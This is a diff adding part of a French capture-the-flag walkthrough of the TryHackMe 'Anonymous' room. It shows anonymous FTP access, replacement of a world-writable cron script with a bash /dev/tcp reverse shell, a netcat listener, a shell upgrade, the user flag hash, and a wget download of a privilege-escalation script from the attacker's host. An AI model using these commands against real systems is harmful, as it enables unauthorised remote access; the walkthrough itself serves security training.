@@ -206,11 +206,181 @@ local: to_do.txt remote: to_do.txt
 ftp>
 ```
 
+Contenu de clean.sh
+
+```bash
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+```
+
+clean.sh va vider le répertoire /tmp et écrire le résultat son action dans le fichier removed\_files.log.
+
+Le Hint de TryHackMe nous dit de nous intéresser au fichier log. Voyons ce qu'il contient:
+
+```
+┌──(kali㉿kali)-[~/THM/anonymous]
+└─$ cat removed_files.log
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+...
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+                                            
+```
+
+Le contenu du fichier log nous montre que clean.sh s'exécute très souvent, probablement toute les minutes via un cron job.
+
+Remarquons également que **nous avons les droit en écriture sur le fichier clean.sh**
+
 ```
 -rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
 ```
 
+### 2. Prise pied sur la machine cible
+
+Remplaçons le fichier clean.sh par notre propre fichier clean.sh qui va appeler un Reverse Shell.
+
+Avec l'aide de  [https://www.revshells.com/](https://www.revshells.com/) editons clean.sh, rendons le exécutable, uploadons le fichier vers la machine cible via FTP anonymous et attendons le reverse shell avec nc&#x20;
+
+```bash
+┌──(kali㉿kali)-[~/THM/anonymous]
+└─$ cat clean.sh       
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.9.3.195/12345 0>&1
+```
+
+```
+chmod +x clean.sh
+ftp anonymous@$IP
+cd scripts
+put clean.sh
+nc -lvnp 12345
+```
+
+```
+/┌──(kali㉿kali)-[~/THM/anonymous]
+└─$ nc -lvnp 12345
+listening on [any] 12345 ...
+connect to [10.9.3.195] from (UNKNOWN) [10.10.238.90] 52170
+bash: cannot set terminal process group (1371): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ 
+```
+
+```
+namelessone@anonymous:~$ whoami
+whoami
+namelessone
+namelessone@anonymous:~$ id
+id
+uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+namelessone@anonymous:~$
+```
+
+[Consolidons le shell](outils.md#id-6.-consolidation-dun-shell)
+
+```
+namelessone@anonymous:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+namelessone@anonymous:~$ ^Z
+zsh: suspended  nc -lvnp 12345
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/anonymous]
+└─$ stty raw -echo; fg              
+[1]  + continued  nc -lvnp 12345
+                                export TERM=xterm
+namelessone@anonymous:~$ stty cols 132 rows 34
+namelessone@anonymous:~$
+```
+
+### 3. User.txt
+
+```
+namelessone@anonymous:~$ ls -l
+total 8
+drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
+-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
+namelessone@anonymous:~$ cat user.txt
+90d6f992585815ff991e68748c414740
+namelessone@anonymous:~$
+```
 
 
 
+## \[Task 3] Escalade de privilèges
 
+Utilisons ma [méthode d'escalade de privilèges](outils.md#id-5.-privilege-escalation)
+
+### 1. sudo -l
+
+Comme nous n'avons pas le password de namelessone, sudo -l n'apporte rien.
+
+### 2. suid3num
+
+Dans le répertoire contenant suid3num.py
+
+```
+┌──(kali㉿kali)-[~/utilitaires]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Sur la machine cible
+
+```
+namelessone@anonymous:/dev/shm$ wget 10.9.3.195:8000/suid3num.py
+--2024-12-16 15:07:59--  http://10.9.3.195:8000/suid3num.py
+Connecting to 10.9.3.195:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16632 (16K) [text/x-python]
+Saving to: ‘suid3num.py’
+
+suid3num.py                        0%[                                                           ]       0  --.-KB/s   suid3num.py                      100%[==========================================================>]  16.24K  --.-KB/s    in 0.03s   
+
+2024-12-16 15:07:59 (603 KB/s) - ‘suid3num.py’ saved [16632/16632]
+
+namelessone@anonymous:/dev/shm$ chmod +x suid3num.py
+namelessone@anonymous:/dev/shm$ python3 suid3num.py
+```
+
+<figure><img src=".gitbook/assets/suid3num (1).png" alt=""><figcaption></figcaption></figure>
